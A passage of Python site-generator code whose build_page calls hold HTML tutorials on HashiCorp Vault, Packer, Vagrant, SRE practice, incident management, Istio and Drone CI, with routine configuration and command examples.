             "<p>Vault secrets engines are pluggable backends that generate, store, or encrypt secrets. The <strong>KV (Key-Value)</strong> engine stores static secrets (API keys, database passwords) at version 2 with metadata, versioning, and configurable deletion. Enable it with <code>vault secrets enable -path=secret kv-v2</code>. Read and write with <code>vault kv put secret/myapp key=value</code> and <code>vault kv get secret/myapp</code>.</p>"
             "<p><strong>Transit</strong> engine provides encryption-as-a-service — data is encrypted/decrypted in the Vault server without leaving the application. <strong>PKI</strong> engine generates X.509 certificates on-demand with configurable TTLs. <strong>Database</strong> engine creates dynamic database credentials. <strong>AWS/Azure/GCP</strong> engines generate cloud IAM credentials dynamically. Each engine has specific configuration and lifecycle management — rotate keys regularly and audit all operations.</p>"
             "<ul>"
             "<li><strong>KV v2</strong> — versioned key-value storage with metadata</li>"
             "<li><strong>Transit</strong> — encryption/decryption without exposing keys</li>"
             "<li><strong>PKI</strong> — dynamic TLS certificate generation</li>"
             "<li><strong>Database</strong> — short-lived SQL credentials with TTL</li>"
             "</ul>"),
            ("Dynamic Secrets",
             "<p>Dynamic secrets are generated on-demand with lease durations and automatically revoked when the lease expires. This eliminates the need for long-lived credentials sprawled across config files. The <strong>Database Secrets Engine</strong> dynamically creates database users with specific roles: <code>vault write database/roles/my-role db_name=mysql creation_statements=\"CREATE USER ...\" default_ttl=1h max_ttl=24h</code>.</p>"
             "<p>Applications authenticate to Vault, request credentials, and receive username/password with a lease. Vault automatically rotates the credentials every hour (or as configured). If the application crashes, credentials expire naturally — no manual cleanup needed. Use <code>vault lease renew</code> to extend a lease, <code>vault lease revoke</code> to immediately invalidate credentials. The <strong>built-in revocation</strong> hook ensures all dynamic credentials are cleaned up at the database/AWS API level.</p>"
             "<pre><code># Configure Postgres dynamic credentials\nvault write database/config/postgres-db \\\n  plugin_name=postgresql-database-plugin \\\n  allowed_roles=my-role \\\n  connection_url=\"postgresql://{{username}}:{{password}}@localhost:5432/mydb\" \\\n  username=\"vault\" password=\"vault-pass\"\n\nvault write database/roles/my-role \\\n  db_name=postgres-db \\\n  creation_statements=\"CREATE USER \\\"{{name}}\\\" WITH PASSWORD '{{password}}' VALID UNTIL '{{expiration}}'; GRANT SELECT ON ALL TABLES IN SCHEMA public TO \\\"{{name}}\\\";\" \\\n  default_ttl=1h max_ttl=24h</code></pre>"),
            ("Policies and Access Control",
             "<p>Vault policies are written in HCL and define what paths a token can access and what operations it can perform. Policies follow the principle of least privilege — grant only the specific paths and capabilities needed. Capabilities include <code>create</code>, <code>read</code>, <code>update</code>, <code>delete</code>, <code>list</code>, <code>sudo</code>, and <code>deny</code>. Write policies to files and apply them with <code>vault policy write my-policy my-policy.hcl</code>.</p>"
             "<p>Authentication methods (<strong>auth methods</strong>) verify identities before issuing tokens. Common methods include <strong>Token</strong> (simple but least secure), <strong>AppRole</strong> (machine-to-machine with secret ID rotation), <strong>Kubernetes</strong> (service account-based), <strong>LDAP</strong>, <strong>OIDC</strong>, and <strong>AWS IAM</strong>. Use <strong>AppRole</strong> for automated deployments — Vault issues a <code>role-id</code> and <code>secret-id</code> that applications use to authenticate and receive a token scoped by policies.</p>"
             "<pre><code># Policy HCL — read access to KV secrets\npath \"secret/data/myapp/*\" {\n  capabilities = [\"read\", \"list\"]\n}\npath \"secret/metadata/myapp/*\" {\n  capabilities = [\"list\"]\n}\n\n# AppRole authentication\nvault write auth/approle/role/my-app \\\n  token_policies=my-policy \\\n  secret_id_ttl=10m \\\n  token_ttl=1h</code></pre>"),
            ("Vault Integration Patterns",
             "<p>Applications integrate with Vault through one of three patterns: <strong>Sidecar</strong> (Vault Agent runs alongside the application, handling authentication and secret injection), <strong>SDK</strong> (application code directly calls Vault API using Go/Java/Python/.NET libraries), or <strong>CSI Provider</strong> (Kubernetes secrets store CSI driver mounts Vault secrets as volumes).</p>"
             "<p>Vault Agent sidecar handles templating — watch for secret changes and reload applications automatically. For Kubernetes, the <strong>Vault Agent Injector</strong> mutates pod specs to add Vault Agent containers. The <strong>Secrets Store CSI Driver</strong> mounts Vault secrets as a filesystem volume that updates automatically when secrets change. Choose the pattern that best fits your stack and operational maturity — sidecar is easiest for existing apps, SDK provides the most control.</p>"
             "<pre><code># Kubernetes pod annotation for Vault injection\nmetadata:\n  annotations:\n    vault.hashicorp.com/agent-inject: \"true\"\n    vault.hashicorp.com/role: \"my-app\"\n    vault.hashicorp.com/agent-inject-secret-config.txt: \"secret/data/myapp\"</code></pre>"),
        ],
        further=[
            ("Vault Documentation", "Official HashiCorp Vault documentation covering all engines, auth methods, and operations.", "https://www.vaultproject.io/docs"),
            ("Vault Tutorials", "Hands-on interactive tutorials for Vault from HashiCorp Learn.", "https://learn.hashicorp.com/vault"),
            ("Vault Reference Architecture", "Production deployment patterns for Vault including HA, disaster recovery, and performance.", "https://www.vaultproject.io/docs/enterprise/reference-architecture"),
        ],
    )

    build_page(
        title="Packer Image Building",
        filename="packer-guide.html",
        desc="Automate machine image creation with Packer — build immutable infrastructure with multi-cloud builders, provisioners, and post-processors.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Immutable Infrastructure",
             "<p>Packer creates identical machine images for multiple platforms from a single template. Immutable infrastructure treats servers as disposable — when you need to update software, security patches, or configuration, you build a new image and replace running instances instead of patching in place. This eliminates configuration drift and makes deployments deterministic.</p>"
             "<p>Packer templates are JSON or HCL files that define builders (image sources), provisioners (configuration steps), and post-processors (image optimization). The build process: (1) launches a temporary instance from a base image, (2) runs provisioners to install and configure software, (3) shuts down the instance, (4) creates a new image artifact. Benefits include faster deployments, consistent environments, and easy rollback by reverting to a previous image.</p>"
             "<ul>"
             "<li>No configuration drift — every instance starts from the same image</li>"
             "<li>Versioned images — tag with build ID, git SHA, or timestamp</li>"
             "<li>Multi-cloud support — same template builds AMI, GCP image, Vagrant box</li>"
             "<li>Faster scaling — no config time during autoscaling events</li>"
             "</ul>"),
            ("Builders",
             "<p>Builders are the source of images. Packer supports builders for <strong>Amazon EBS</strong> (AMI), <strong>Google Compute</strong> (GCP image), <strong>Azure</strong> (Managed Image), <strong>VMware</strong>, <strong>VirtualBox</strong>, <strong>Docker</strong>, <strong>QEMU</strong>, and <strong>OpenStack</strong>. Each builder has platform-specific configurations — source AMI, instance type, region, SSH username, and tags. The <code>amazon-ebs</code> builder creates an EC2 instance from a base AMI, provisions it, and creates a new AMI.</p>"
             "<p>Use <strong>source filters</strong> to dynamically select the latest base image by name, owner, or tags. Example: <code>source_ami_filter</code> with <code>name: \"ubuntu/images/*ubuntu-22.04*\"</code> and <code>owners: [\"099720109477\"]</code> (Canonical). The <strong>VPC</strong> config controls network placement — use a private subnet with NAT for secure builds. SSH key pairs are generated per build and discarded after completion, ensuring no leftover credentials.</p>"
             "<pre><code>source \"amazon-ebs\" \"ubuntu\" {\n  ami_name      = \"my-app-{{timestamp}}\"\n  instance_type = \"t3.medium\"\n  region        = \"us-east-1\"\n  source_ami_filter {\n    filters = { virtualization-type = \"hvm\"\n      name = \"ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*\" }\n    owners = [\"099720109477\"]\n    most_recent = true\n  }\n  ssh_username = \"ubuntu\"\n}</code></pre>"),
            ("Provisioners",
             "<p>Provisioners run scripts and configuration management tools on the temporary instance. Built-in provisioners include <strong>shell</strong> (bash scripts), <strong>file</strong> (upload files), <strong>ansible</strong> (playbook execution), <strong>chef</strong>, <strong>puppet</strong>, and <strong>salt</strong>. The <code>shell</code> provisioner executes inline commands or script files — install packages, configure services, apply hardening, create users.</p>"
             "<p><strong>Order matters</strong> — provisioners run in the order defined in the template. A typical sequence: (1) upload configuration files, (2) run shell to install OS packages, (3) execute Ansible for application setup, (4) cleanup (remove SSH keys, temp files, package cache). Use <strong>pause_before</strong> for SSH readiness, <strong>timeout</strong> for long-running provisioners, and <strong>skip_clean</strong> to preserve logs for debugging. Use <strong>Ansible local</strong> provisioner for complex configurations with idempotency.</p>"
             "<pre><code>build {\n  sources = [\"source.amazon-ebs.ubuntu\"]\n  provisioner \"file\" {\n    source = \"app.conf\"\n    destination = \"/tmp/app.conf\"\n  }\n  provisioner \"shell\" {\n    inline = [\"sudo apt-get update\",\n      \"sudo apt-get install -y nginx\",\n      \"sudo mv /tmp/app.conf /etc/nginx/app.conf\"]\n  }\n  provisioner \"ansible\" {\n    playbook_file = \"./playbooks/application.yml\"\n  }\n}</code></pre>"),
            ("Post-Processors",
             "<p>Post-processors run after the image is created. Use them to compress images (Vagrant boxes), push to registries (Docker Hub), sign artifacts, or run tests. The <strong>vagrant</strong> post-processor packages the image as a Vagrant box for local development. <strong>manifest</strong> outputs build metadata (artifact ID, region) to a JSON file for CI/CD consumption. <strong>compress</strong> archives the output artifact.</p>"
             "<p>Post-processors can be chained in a pipeline — build an image, run tests, upload to a registry, send a notification. The <strong>artifice</strong> post-processor lets you reference pre-built artifacts for further processing. Validate templates with <code>packer validate template.pkr.hcl</code>. Build with <code>packer build template.pkr.hcl</code> and use <code>-var-file</code> for environment-specific variables. Automate image building in CI/CD — trigger rebuilds on Git commits to infrastructure code.</p>"
             "<pre><code># Validate and build\npacker validate -var \"region=us-west-2\" template.pkr.hcl\npacker build -var-file=production.pkrvars.hcl template.pkr.hcl\n\n# Post-processor manifest output\npost-processor \"manifest\" {\n  output = \"manifest.json\"\n  strip_path = true\n}</code></pre>"),
        ],
        further=[
            ("Packer Documentation", "Official Packer documentation covering builders, provisioners, and HCL templates.", "https://www.packer.io/docs"),
            ("Packer Tutorials", "HashiCorp Learn tutorials for Packer — from beginner to production patterns.", "https://learn.hashicorp.com/packer"),
            ("HashiCorp Blog — Packer Patterns", "Best practices for immutable infrastructure with Packer and CI/CD integration.", "https://www.hashicorp.com/blog/category/packer"),
        ],
    )

    build_page(
        title="Vagrant Development Environments",
        filename="vagrant-guide.html",
        desc="Create reproducible development environments with Vagrant — multi-machine setups, provisioning, networking, and synced folders.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Vagrantfile Basics",
             "<p>Vagrant manages virtual machine lifecycles using a single configuration file called <code>Vagrantfile</code>. Written in Ruby, the Vagrantfile defines the box (base image), provider (VirtualBox, VMware, Hyper-V, Docker), networking, synced folders, and provisioners. Start a project with <code>vagrant init</code> and edit the generated Vagrantfile. The <code>Vagrantfile</code> is version-controlled alongside source code, ensuring every developer gets the same environment.</p>"
             "<p>Key Vagrantfile directives include <code>config.vm.box</code> (base image from Vagrant Cloud or local cache), <code>config.vm.network</code> (port forwarding, private/public network), <code>config.vm.synced_folder</code> (share code between host and guest), and <code>config.vm.provision</code> (shell scripts, Ansible, Docker, or file uploads). Use <code>config.vm.define</code> for multi-machine setups — each define creates a separate VM within the same project.</p>"
             "<pre><code>Vagrant.configure(\"2\") do |config|\n  config.vm.box = \"ubuntu/jammy64\"\n  config.vm.network \"forwarded_port\", guest: 80, host: 8080\n  config.vm.network \"private_network\", ip: \"192.168.56.10\"\n  config.vm.synced_folder \"./app\", \"/var/www/app\"\n  config.vm.provider \"virtualbox\" do |vb|\n    vb.memory = \"2048\"\n    vb.cpus = 2\n  end\nend</code></pre>"),
            ("Provisioning",
             "<p>Provisioners configure the VM after initial boot. The <code>shell</code> provisioner runs inline commands or script files — use it for package installation, configuration, and service setup. For complex setups, use <strong>Ansible</strong> (runs playbooks against the guest), <strong>Docker</strong> (install Docker and pull containers), or <strong>File</strong> (upload files before other provisioning). Provisioners can be run inline, from a script path, or as external tools.</p>"
             "<p>Provisioning runs only once by default (<code>--provision</code> flag) unless you use <code>--provision-with</code> to re-run specific provisioners. Use <code>vagrant reload --provision</code> to reapply provisioning after configuration changes. For idempotent provisioning, use Ansible or shell scripts that check for existing state. The <code>config.vm.provision</code> directive accepts <code>run: \"always\"</code> to run on every <code>vagrant up</code> or <code>vagrant reload</code>.</p>"
             "<ul>"
             "<li><code>shell</code> — inline or script-based provisioning</li>"
             "<li><code>ansible</code> — run Ansible playbooks against the VM</li>"
             "<li><code>docker</code> — install Docker and start containers</li>"
             "<li><code>file</code> — upload files from host to guest</li>"
             "</ul>"),
            ("Networking",
             "<p>Vagrant supports three network modes: <strong>forwarded ports</strong> (map guest to host ports), <strong>private network</strong> (host-only IP for host-to-VM access), and <strong>public network</strong> (VM appears as a physical machine on the network with its own IP via DHCP or static). Forwarded ports are easiest — <code>config.vm.network \"forwarded_port\", guest: 3000, host: 3000</code> — but conflict if multiple VMs use the same host port.</p>"
             "<p>Private networks are ideal for multi-machine setups — each VM gets an IP in a host-only range, allowing them to communicate with each other and the host. Public networks require admin privileges (bridged networking) but enable other network devices to access the VM. Use <code>auto_correct: true</code> on forwarded ports to automatically shift the host port if conflicted. Multiple network interfaces can be configured per VM.</p>"
             "<pre><code># Multi-machine networking example\nVagrant.configure(\"2\") do |config|\n  config.vm.define \"web\" do |web|\n    web.vm.network \"private_network\", ip: \"192.168.56.10\"\n    web.vm.network \"forwarded_port\", guest: 80, host: 8080\n  end\n  config.vm.define \"db\" do |db|\n    db.vm.network \"private_network\", ip: \"192.168.56.20\"\n    db.vm.network \"forwarded_port\", guest: 5432, host: 5432\n  end\nend</code></pre>"),
            ("Plugins and Box Management",
             "<p>Vagrant has a plugin system extending core functionality. Useful plugins include <code>vagrant-vbguest</code> (auto-update VirtualBox Guest Additions), <code>vagrant-hostsupdater</code> (manage <code>/etc/hosts</code> entries), <code>vagrant-disksize</code> (resize the VM disk), and <code>vagrant-cachier</code> (cache packages for faster provisioning). Install plugins with <code>vagrant plugin install &lt;name&gt;</code> and list with <code>vagrant plugin list</code>.</p>"
             "<p>Manage Vagrant boxes with <code>vagrant box add &lt;name&gt;</code>, <code>vagrant box list</code>, <code>vagrant box update</code>, and <code>vagrant box remove</code>. Boxes are stored in <code>~/.vagrant.d/boxes/</code>. Use <code>packer</code> to build custom boxes with your exact tool chain. Share custom boxes via Vagrant Cloud (public) or HTTP server (private). Run <code>vagrant status</code> to see VM states, <code>vagrant ssh</code> to connect, and <code>vagrant destroy -f</code> to tear down cleanly.</p>"
             "<pre><code># Plugin management\nvagrant plugin install vagrant-vbguest\nvagrant plugin install vagrant-hostsupdater\nvagrant plugin list\n\n# Box management\nvagrant box add ubuntu/jammy64\nvagrant box list\nvagrant box update --box ubuntu/jammy64</code></pre>"),
        ],
        further=[
            ("Vagrant Documentation", "Official Vagrant documentation covering all features, providers, and development workflows.", "https://www.vagrantup.com/docs"),
            ("Vagrant Cloud", "Public registry of Vagrant boxes for various operating systems and configurations.", "https://app.vagrantup.com/"),
            ("HashiCorp Learn — Vagrant", "Hands-on Vagrant tutorials covering multi-machine and provisioning patterns.", "https://learn.hashicorp.com/vagrant"),
        ],
    )

    build_page(
        title="SRE Fundamentals",
        filename="sre-fundamentals.html",
        desc="Learn Site Reliability Engineering principles — SLIs, SLOs, error budgets, toil reduction, and building reliable distributed systems.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("SLIs and SLOs",
             "<p>Service Level Indicators (SLIs) are quantitative measures of service quality — latency (request duration), availability (uptime percentage), throughput (requests per second), and error rate (failed requests / total requests). Choose SLIs that directly reflect user experience. For example, <strong>99th percentile latency</strong> matters more than average, because slow requests to 1% of users represent real pain.</p>"
             "<p>Service Level Objectives (SLOs) are target values for SLIs, expressed as thresholds over a time window. Example: <strong>99.9% of requests complete in under 200ms, measured over a rolling 30-day window</strong>. SLOs should be ambitious but achievable — setting 100% is unrealistic and leads to over-engineering. The formula: <code>good_events / total_events &gt;= target</code>. Measure <code>good_events</code> (requests meeting the threshold) and <code>total_events</code> (all requests) from your monitoring system.</p>"
             "<ul>"
             "<li><strong>Latency SLI</strong> — p99 HTTP response time &lt; 200ms</li>"
             "<li><strong>Availability SLI</strong> — successful HTTP rate &gt; 99.9%</li>"
             "<li><strong>Throughput SLI</strong> — requests per second per instance</li>"
             "<li><strong>Durability SLI</strong> — data loss rate &lt; 0.0001%</li>"
             "</ul>"),
            ("Error Budgets",
             "<p>The error budget is the maximum allowable service degradation over a defined period, calculated as <code>1 - SLO</code>. For a 99.9% monthly SLO, the error budget is 0.1% of total requests (approximately 43 minutes of downtime). Error budgets convert reliability into a measurable, consumable resource that product teams and SRE teams can trade off against feature velocity.</p>"
             "<p>When the error budget is exhausted (i.e., the service has spent all its allowed unreliability), releases must stop until reliability improves. This creates a feedback loop — developers are incentivized to build reliable features, and SREs have a data-backed mechanism to enforce stability. Use monitoring tools (Prometheus, Datadog, CloudWatch) to track budget burn rate. Alert when consumption exceeds a rate that would deplete the budget before the window ends.</p>"
             "<pre><code># Prometheus recording rule for SLO burn rate\n- record: job:slo_errors:ratio_rate30m\n  expr: |\n    rate(http_requests_total{code=~\"5..\"}[30m])\n    /\n    rate(http_requests_total[30m])\n\n# Alert when 90% of error budget consumed in 7 days\n- alert: ErrorBudgetBurn\n  expr: |\n    (1 - job:slo_errors:ratio_rate30m) &lt; 0.999\n  for: 6h</code></pre>"),
            ("Toil Reduction",
             "<p>Toil is manual, repetitive, automatable work that doesn't produce lasting value — restarting stuck processes, answering escalations manually, deploying by hand, and updating config files via SSH. Google's SRE book defines toil as work tied to a service that is manual, repetitive, automatable, tactical, has no enduring value, and scales linearly with service growth.</p>"
             "<p>Measure toil by tracking time spent on manual operations. Target less than 50% of engineering time on toil (mature SRE teams aim for &lt;20%). Eliminate toil through automation: (1) script the operation, (2) parameterize it, (3) expose it via a self-service interface, (4) integrate it with incident response. Use <strong>ChatOps</strong> bots (Slack commands) for common tasks. Prioritize automation by frequency and time saved — focus on the 20% of toil causing 80% of overhead.</p>"
             "<p>Examples of automatable toil: deployment rollback scripts, auto-remediation of common alerts (disk space cleanup, certificate renewal), automated user provisioning, and self-service environment creation.</p>"),
            ("Incident Management",
             "<p>SRE incident management follows a formal lifecycle: detection → response → mitigation → resolution → postmortem. Use <strong>alerting</strong> (Prometheus Alertmanager, PagerDuty) with severity levels — P0 (critical, page immediately), P1 (high, page during business hours), P2 (medium, ticket), P3 (low, backlog). Route alerts by service, team, and escalation path. Avoid alert fatigue by tuning thresholds and consolidating correlated alerts.</p>"
             "<p>During incidents, designate a <strong>Incident Commander</strong> (decision maker), <strong>Operations Lead</strong> (executor), and <strong>Communications Lead</strong> (stakeholder updates). Use a <strong>runbook</strong> for standardized responses — documented steps, ownership, and expected TTL for resolution. After mitigation, conduct a <strong>blameless postmortem</strong> — analyze what happened, why it happened, and what systems can prevent recurrence. Share postmortem findings openly to build organizational learning.</p>"
             "<pre><code># Runbook template: disk space full\n# 1. Check disk usage: df -h\n# 2. Identify large files: du -sh /var/log/* | sort -rh\n# 3. Rotate logs: logrotate -f /etc/logrotate.conf\n# 4. If persistent: increase disk (cloud provider console)\n# 5. Escalate if &lt; 5% free after cleanup</code></pre>"),
        ],
        further=[
            ("Google SRE Book", "The foundational book on Site Reliability Engineering from Google.", "https://sre.google/books/"),
            ("SRE Workbook", "Practical exercises and patterns for implementing SRE practices.", "https://sre.google/workbook/"),
            ("Prometheus Documentation", "CNCF monitoring system commonly used for SLI/SLO tracking.", "https://prometheus.io/docs/"),
        ],
    )

    build_page(
        title="Incident Management & On-Call",
        filename="incident-management.html",
        desc="Build effective incident management practices — alerting, runbooks, on-call rotations, postmortems, and escalation procedures.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Alerting Architecture",
             "<p>A well-designed alerting pipeline detects issues early and routes them to the right responder. Metrics flow from services → monitoring system (Prometheus, Datadog) → Alertmanager → notification channels (PagerDuty, Slack, email). Define alerting rules with clear thresholds, duration conditions, and severity labels. Avoid <strong>alert fatigue</strong> — every alert should be actionable and require a human response.</p>"
             "<p>Use <strong>multi-window, multi-burn-rate</strong> alerts for SLO-based monitoring. This approach uses multiple evaluation windows (5m, 30m, 6h) to detect both fast and slow error budget consumption. Configure routing labels (<code>severity: critical</code>, <code>team: platform</code>, <code>service: api</code>) to direct alerts to the correct on-call rotation. Set up <strong>silences</strong> for planned maintenance and <strong>inhibitions</strong> to suppress cascading alerts.</p>"
             "<pre><code># Prometheus alert rule example\ngroups:\n- name: api\n  rules:\n  - alert: HighErrorRate\n    expr: rate(http_requests_total{code=~\"5..\"}[5m]) / rate(http_requests_total[5m]) &gt; 0.01\n    for: 5m\n    labels:\n      severity: critical\n      team: backend\n    annotations:\n      summary: \"API error rate &gt; 1% over 5 minutes\"</code></pre>"),
            ("Runbooks",
             "<p>A runbook is a documented sequence of steps for handling a specific incident scenario. Good runbooks reduce Mean Time To Resolve (MTTR) by removing guesswork during stressful situations. Each runbook should include: (1) symptoms and detection method, (2) severity assessment checklist, (3) step-by-step remediation with commands, (4) verification steps, (5) escalation criteria, and (6) a list of relevant dashboards and logs.</p>"
             "<p>Store runbooks in a version-controlled repository (Git) with the same review process as code. Use tools like <strong>Rundeck</strong>, <strong>FireHydrant</strong>, or <strong>PagerDuty Runbooks</strong> to automate runbook execution — one click can run diagnostic scripts, collect logs, and apply common fixes. Regularly test runbooks during game days or chaos engineering exercises to ensure accuracy. Update runbooks after every incident with new learnings.</p>"
             "<ul>"
             "<li>Symptoms — disk space &lt; 5%, 5xx spiking, p99 latency &gt; 1s</li>"
             "<li>Diagnosis — <code>df -h</code>, <code>journalctl -u service</code>, metrics dashboard</li>"
             "<li>Remediation — restart service, scale up, rollback deploy, block IP</li>"
             "<li>Verification — health check endpoint returns 200, error rate dropping</li>"
             "</ul>"),
            ("On-Call Rotations",
             "<p>On-call rotations balance incident response with engineer well-being. Popular schedules include <strong>follow-the-sun</strong> (shifts follow daylight hours across time zones), <strong>primary/secondary</strong> (two engineers per rotation, secondary handles overflow), and <strong>weekly rotation</strong> (one week on, N weeks off). Use PagerDuty, Opsgenie, or Grafana OnCall to manage schedules, escalation paths, and notification rules.</p>"
             "<p>Define clear shift expectations: acknowledge alerts within 5 minutes, respond within 15 minutes, update the incident log every 30 minutes. Automate handoff reports — summarize active incidents, recent changes, and ongoing issues. Implement <strong>escalation policies</strong>: if the primary doesn't acknowledge within 5 minutes, alert the secondary; if still unacknowledged after 10 minutes, alert the engineering manager. Protect on-call engineers with time-off compensation and limit shift frequency.</p>"
             "<p>Regularly review on-call metrics: time to acknowledge, time to resolve, alert volume per shift, and number of false positives. Use these metrics to improve alert thresholds, runbook quality, and system reliability.</p>"),
            ("Postmortems",
             "<p>The postmortem is a blameless analysis of an incident — its purpose is learning, not punishment. Write postmortems within 48 hours of incident resolution while details are fresh. Include: (1) incident summary and impact (user-facing, financial), (2) timeline of key events with timestamps, (3) root cause analysis using the <strong>Five Whys</strong> technique, (4) what worked well and what didn't, and (5) actionable follow-up items with owners and deadlines.</p>"
             "<p>Good postmortems identify systemic issues, not individual mistakes. When a deployment caused an outage, ask: why didn't canary testing catch it? Why wasn't there a rollback button? Why didn't monitoring alert us before users reported it? Assign each action item to a specific owner and track completion in your project management system. Share postmortems company-wide to spread knowledge and build a reliability culture.</p>"
             "<pre><code># Postmortem template structure\n# Incident: [ID] - [Title]\n# Date: YYYY-MM-DD\n# Severity: Critical/High/Medium\n# Summary: 2-3 sentence description\n# Timeline: [Time] - [Event]\n# Root Cause: Five Whys analysis\n# Action Items: [Owner] - [Item] - [Due Date]</code></pre>"),
        ],
        further=[
            ("PagerDuty Incident Response", "Best practices for incident response workflows and on-call management.", "https://response.pagerduty.com/"),
            ("Google SRE — Postmortem Culture", "Google's approach to blameless postmortems and organizational learning.", "https://sre.google/sre-book/postmortem-culture/"),
            ("FireHydrant Incident Management", "Open-source incident management platform with runbook automation.", "https://firehydrant.com/"),
        ],
    )

    build_page(
        title="Istio Service Mesh",
        filename="istio-service-mesh.html",
        desc="Deploy and manage Istio service mesh — sidecar injection, traffic management, security policies, and observability for Kubernetes.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Service Mesh Architecture",
             "<p>Istio is a service mesh that provides traffic management, security, and observability for microservices without requiring code changes. It deploys an <strong>Envoy sidecar proxy</strong> alongside each pod — all service-to-service traffic routes through Envoy, enabling Istio to enforce policies, collect telemetry, and route traffic. The control plane (<code>istiod</code>) manages proxy configuration, certificate distribution, and policy enforcement.</p>"
             "<p>Key components: <strong>Pilot</strong> (traffic management — translates routing rules into Envoy config), <strong>Citadel</strong> (security — issues TLS certificates for mTLS), <strong>Galley</strong> (configuration validation and distribution). The data plane consists entirely of Envoy proxies. Install Istio with <code>istioctl install --set profile=demo</code> for testing or <code>default</code>/<code>production</code> profiles for production. Use the <code>IstioOperator</code> CR for fine-grained control.</p>"
             "<ul>"
             "<li>Transparent proxy injection — label namespace with <code>istio-injection=enabled</code></li>"
             "<li>Envoy-based — battle-tested proxy handling Layer 7 traffic</li>"
             "<li>Control plane — single <code>istiod</code> binary (simplified since 1.5)</li>"
             "<li>Multi-cluster support — mesh across clusters with federation or primary-remote</li>"
             "</ul>"),
            ("Traffic Management",
             "<p>Istio traffic management uses <strong>VirtualServices</strong> and <strong>DestinationRules</strong> to control request routing. VirtualService defines routing rules based on host, URI path, headers, or weight — enabling canary deployments, A/B testing, and blue-green releases. DestinationRule defines how to handle traffic to a service after routing — connection pools, circuit breakers, load balancing, outlier detection, and TLS settings.</p>"
             "<p>Common traffic management patterns: <strong>canary release</strong> — route 90% to v1 and 10% to v2, then shift gradually. <strong>Mirroring</strong> (shadowing) — send a copy of traffic to a new version without impacting responses. <strong>Circuit breaking</strong> — trip the circuit when consecutive 5xx errors exceed a threshold, preventing cascade failures. <strong>Timeouts and retries</strong> — configure per-route timeouts and retry policies for resilience.</p>"
             "<pre><code>apiVersion: networking.istio.io/v1beta1\nkind: VirtualService\nmetadata: name: reviews\nspec:\n  hosts: [reviews]\n  http:\n  - match: [headers: {end-user: {exact: \"test\"}}]\n    route: [destination: {host: reviews, subset: v2}]\n  - route:\n    - destination: {host: reviews, subset: v1, weight: 90}\n    - destination: {host: reviews, subset: v2, weight: 10}</code></pre>"),
            ("Security Policies",
             "<p>Istio security operates in layers: <strong>mTLS</strong> (encrypt and authenticate all service-to-service traffic), <strong>AuthorizationPolicy</strong> (allow/deny rules based on identity, IP, or JWT claims), <strong>PeerAuthentication</strong> (enforce mTLS mode per namespace or workload), and <strong>RequestAuthentication</strong> (validate JWT tokens at the proxy). Enable <strong>STRICT mTLS</strong> (<code>PeerAuthentication</code> with <code>mode: STRICT</code>) for production — this encrypts all mesh traffic and blocks unauthenticated requests.</p>"
             "<p>Authorization policies follow a deny-by-default model. Define a policy that explicitly allows required traffic — everything else is denied. Use <code>action: ALLOW</code> for whitelist rules, <code>DENY</code> for blacklist. Conditions can match on source principal, requested headers, destination port, or JWT claims. Istio integrates with external identity providers via JWK, OIDC, or custom JWT. Regularly audit authorization policies with <code>istioctl authz check</code>.</p>"
             "<pre><code>apiVersion: security.istio.io/v1beta1\nkind: AuthorizationPolicy\nmetadata: name: productpage\nspec:\n  selector: {matchLabels: {app: productpage}}\n  rules:\n  - from:\n    - source: {principals: [\"cluster.local/ns/default/sa/frontend\"]}\n    to:\n    - operation: {ports: [\"8080\"], methods: [\"GET\"]}</code></pre>"),
            ("Observability",
             "<p>Istio provides deep observability without application instrumentation. The mesh automatically collects metrics (HTTP request count, duration, size, TCP byte counts), distributed traces (with Zipkin, Jaeger, or OpenTelemetry), and access logs. <strong>Kiali</strong> is the graphical dashboard for service mesh — it shows topology graphs with real-time traffic flow, health indicators, and configuration validation.</p>"
             "<p>Prometheus metrics are exposed per-proxy and aggregated mesh-wide. Key metrics include <code>istio_requests_total</code> (total requests by response code, source, destination, and response flag), <code>istio_request_duration_milliseconds</code> (latency histograms), and <code>istio_request_bytes</code> (request sizes). Integrate with Grafana for pre-built Istio dashboards. Enable <strong>distributed tracing</strong> by configuring <code>meshConfig.defaultConfig.tracing.zipkin.address</code> — Istio propagates trace context headers (B3, W3C Trace Context) across proxies.</p>"
             "<pre><code># Enable access logging in Istio\nmeshConfig:\n  accessLogFile: /dev/stdout\n  accessLogEncoding: JSON\n  defaultConfig:\n    tracing:\n      zipkin:\n        address: zipkin.istio-system:9411</code></pre>"),
        ],
        further=[
            ("Istio Documentation", "Official Istio docs covering installation, traffic management, security, and observability.", "https://istio.io/latest/docs/"),
            ("Istio in Action Book", "Practical book on Istio service mesh with real-world patterns and recipes.", "https://www.manning.com/books/istio-in-action"),
            ("Kiali Dashboard", "Observability console for Istio service mesh with topology and metrics.", "https://kiali.io/"),
        ],
    )

    build_page(
        title="Drone CI Pipeline Setup",
        filename="drone-ci.html",
        desc="Build continuous integration pipelines with Drone CI — pipeline configuration, parallel steps, services, secrets management, and plugin ecosystem.",
        badge="DevOps",
        icon="fas fa-cogs",
        sections=[
            ("Pipeline Configuration",
             "<p>Drone CI uses a YAML configuration file (<code>.drone.yml</code>) stored in the root of your repository. Pipelines execute inside ephemeral Docker containers, providing isolated and reproducible builds. A basic pipeline includes a <code>kind: pipeline</code> declaration, <code>type: docker</code>, a trigger event (<code>push</code>, <code>pull_request</code>, <code>tag</code>), and a series of <code>steps</code> mapping to Docker images.</p>"
             "<p>Steps define commands executed sequentially. Each step runs in a fresh container using the specified image. Multiplex dependencies using <code>depends_on</code>, parallelize with sibling steps, and propagate environment variables with <code>environment</code> blocks. Drone injects default <code>DRONE_*</code> environment variables (commit SHA, branch, repo name) that plug into build scripts. Validate configuration with <code>drone lint</code> before pushing.</p>"
             "<pre><code>kind: pipeline\ntype: docker\nname: default\n\nsteps:\n- name: test\n  image: node:18\n  commands:\n  - npm ci\n  - npm run lint\n  - npm run test\n\n- name: build\n  image: node:18\n  commands:\n  - npm run build\n  depends_on: [test]</code></pre>"),
            ("Parallel Execution and Services",
